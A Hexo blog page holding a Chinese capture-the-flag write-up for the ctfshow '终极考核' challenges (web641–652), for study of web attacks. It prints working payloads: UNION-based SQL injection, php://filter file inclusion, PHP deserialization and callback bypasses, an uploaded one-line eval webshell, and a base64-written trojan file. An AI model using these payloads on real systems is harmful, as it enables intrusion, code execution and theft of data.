@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":250,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":"default","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="ctfshow终极考核">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow终极考核">
+<meta property="og:url" content="http://example.com/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="ctfshow终极考核">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230529200549.png">
+<meta property="og:image" content="http://example.com/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530203117.png">
+<meta property="og:image" content="http://example.com/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530203252.png">
+<meta property="og:image" content="http://example.com/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530213014.png">
+<meta property="og:image" content="http://example.com/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530204447.png">
+<meta property="og:image" content="http://example.com/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230601170949.png">
+<meta property="article:published_time" content="2023-05-29T11:53:27.000Z">
+<meta property="article:modified_time" content="2024-05-03T08:43:42.727Z">
+<meta property="article:author" content="小zhou">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230529200549.png">
+
+<link rel="canonical" href="http://example.com/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfshow终极考核 | blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow终极考核
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-05-29 19:53:27" itemprop="dateCreated datePublished" datetime="2023-05-29T19:53:27+08:00">2023-05-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-05-03 16:43:42" itemprop="dateModified" datetime="2024-05-03T16:43:42+08:00">2024-05-03</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> ctfshow终极考核</p>
+ <span id="more"></span>
+
+<p>在消息头中，发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_641=ctfshow&#123;affac61c787a82cc396585bea8ecf2dc&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看源码，发现&#x2F;system36d&#x2F;，登录，查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system36d/static/js/lock/index.js</span><br></pre></td></tr></table></figure>
+
+<p>发现</p>
+<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230529200549.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_644=ctfshow&#123;2bb9f2183f102f6f2aedbea4788f9f1d&#125;</span><br></pre></td></tr></table></figure>
+
+<p>搜索发现</p>
+<p>this.pin&#x3D;0x36D，登录</p>
+<p>网络测试里命令执行抓包改为ls</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">checklogin.php</span><br><span class="line">db</span><br><span class="line">index.php</span><br><span class="line">init.php</span><br><span class="line">login.php</span><br><span class="line">logout.php</span><br><span class="line">main.php</span><br><span class="line">secret.txt</span><br><span class="line">static</span><br><span class="line">update.php</span><br><span class="line">update2.php</span><br><span class="line">users.php</span><br><span class="line">util</span><br></pre></td></tr></table></figure>
+
+<p>访secret.txt,url解码，即可看见</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_643=ctfshow&#123;616cd5fc37968fc20810b2db30152717&#125;</span><br></pre></td></tr></table></figure>
+
+<p>点击数据备份，下载，打开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打开远程在线更新抓包，</p>
+<p>远程文件包含，修改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p>发送解密如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>!==<span class="number">99</span> &amp;&amp; <span class="variable">$user</span>!==<span class="number">10</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;1;url=login.php\&quot;&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span>(<span class="string">&#x27;你还没有登陆,请先&lt;a href=&quot;login.php&quot;&gt;登陆&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:main.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- flag_642=ctfshow&#123;<span class="number">11</span>a17b6fbdc69cedfb374f55026700fe&#125; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>，其他源码init.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PATH&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&#x27;/db/data_you_never_know.db&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG645&#x27;</span>,<span class="string">&#x27;flag645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FLAG646&#x27;</span>,<span class="string">&#x27;flag646=ctfshow&#123;5526710eb3ed7b4742232d6d6f9ee3a9&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//存在漏洞，未修补前注释掉</span></span><br><span class="line"><span class="comment">//include &#x27;util/common.php&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>users.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">switch ($a) &#123;</span><br><span class="line">   case &#x27;evilString&#x27;:</span><br><span class="line">       evilString($_GET[&#x27;m&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilNumber&#x27;:</span><br><span class="line">       evilNumber($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilFunction&#x27;:</span><br><span class="line">       evilFunction($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilArray&#x27;:</span><br><span class="line">       evilArray($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br><span class="line">   case &#x27;evilClass&#x27;:</span><br><span class="line">       evilClass($_GET[&#x27;m&#x27;],$_GET[&#x27;key&#x27;]);</span><br><span class="line">       break;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">function evilString($m)&#123;</span><br><span class="line">    $key = &#x27;372619038&#x27;;</span><br><span class="line">    $content = call_user_func($m);  //call_user_func — 把第一个参数作为回调函数调用</span><br><span class="line">    if(stripos($content, $key)!==FALSE)&#123;   //stripos() 函数查找字符串在另一字符串中第一次出现的位置</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG647&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;you are not 372619038?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilClass($m,$k)&#123;</span><br><span class="line">    class ctfshow&#123;</span><br><span class="line">        public $m;</span><br><span class="line">        public function construct($m)&#123;</span><br><span class="line">            $this-&gt;$m=$m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ctfshow=new ctfshow($m);</span><br><span class="line">    $ctfshow-&gt;$m=$m;</span><br><span class="line">    if($ctfshow-&gt;$m==$m &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG647&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG648&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;mmmmm?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilNumber($m,$k)&#123;</span><br><span class="line">    $number = getArray(1000,20,10,999);</span><br><span class="line">    if($number[$m]==$m &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG648&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG649&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;number is right?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilFunction($m,$k)&#123;</span><br><span class="line">    $key = &#x27;ffffffff&#x27;;</span><br><span class="line">    $content = call_user_func($m);</span><br><span class="line">    if(stripos($content, $key)!==FALSE &amp;&amp; $k==shell_exec(&#x27;cat /FLAG/FLAG649&#x27;))&#123;</span><br><span class="line">        echo shell_exec(&#x27;cat /FLAG/FLAG650&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;you are not ffffffff?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function evilArray($m,$k)&#123;</span><br><span class="line">    $arrays=unserialize($m);</span><br><span class="line">    if($arrays!==false)&#123;</span><br><span class="line">        if(array_key_exists(&#x27;username&#x27;, $arrays) &amp;&amp; in_array(&#x27;ctfshow&#x27;, get_object_vars($arrays)) &amp;&amp;  $k==shell_exec(&#x27;cat /FLAG/FLAG650&#x27;))&#123;</span><br><span class="line">            echo shell_exec(&#x27;cat /FLAG/FLAG651&#x27;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;array?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web647,返回值是个数组绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system36d/users.php?action=evilString&amp;m=getallheaders</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web648</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=evilClass&amp;m=1&amp;key=flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web649,NULL绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=evilNumber&amp;m=&amp;key=flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web650</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system36d/users.php?action=evilFunction&amp;m=getenv&amp;key=flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web651</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line">    public $ctfshow = 1;</span><br><span class="line">    public $username = 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize(new ctfshow));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system36d/users.php?action=evilArray&amp;m=O%3A7%3A&quot;ctfshow&quot;%3A2%3A&#123;s%3A7%3A&quot;ctfshow&quot;%3Bi%3A1%3Bs%3A8%3A&quot;username&quot;%3Bi%3A2%3B&#125;&amp;key=flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web652</p>
+<p>page.php 初注入，或者sqlmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1) union select group_concat(schema_name) from information_schema.schemata-- -</span><br></pre></td></tr></table></figure>
+
+<p>返回：information_schema,test,mysql,performance_schema,ctfshow</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1) union select group_concat(table_name) from information_schema.tables where table_schema=0x63746673686f77%23</span><br></pre></td></tr></table></figure>
+
+<p>返回：ctfshow_keys,ctfshow_secret,ctfshow_users</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0) union select group_concat(column_name) from information_schema.columns where table_name=0x63746673686f775f736563726574%23</span><br></pre></td></tr></table></figure>
+
+<p>返回：secret</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page.php?id=0) union select secret from ctfshow_secret%23</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_652=ctfshow&#123;4b37ab4b6504d43ea0de9a688f0e3ffa&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_645=ctfshow&#123;28b00f799c2e059bafaa1d6bda138d89&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看，key </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select `key` from ctfshow_keys%23</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key_is_here_you_know</span><br></pre></td></tr></table></figure>
+
+<p>common.php,文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;dbutil.php&#x27;;</span><br><span class="line">if($_GET[&#x27;k&#x27;]!==shell_exec(&#x27;cat /FLAG/FLAG651&#x27;))&#123;</span><br><span class="line">    die(&#x27;651flag未拿到&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&#x27;file&#x27;]) &amp;&amp; file_exists($_POST[&#x27;file&#x27;]))&#123;</span><br><span class="line">    if(db::get_key()==$_POST[&#x27;key&#x27;])&#123;</span><br><span class="line">        include __DIR__.DIRECTORY_SEPARATOR.$_POST[&#x27;file&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>init.php</code>得到了db文件位置，<code>/db/data_you_never_know.db</code></li>
+</ul>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>数据恢复处上传文件，名字为1.dat  ，内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件包含，即可命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&quot;echo &#x27;PD89ZXZhbCgkX1BPU1RbMV0pPz4=&#x27; | base64 -d &gt; zhou.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>密码为1</p>
+<p>getshell 但发现把命令执行函数都都禁用了，没能绕过disable_function,</p>
+<p>查看这个文件发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system36d/util/dbutil.php</span><br></pre></td></tr></table></figure>
+
+<p>数据库信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 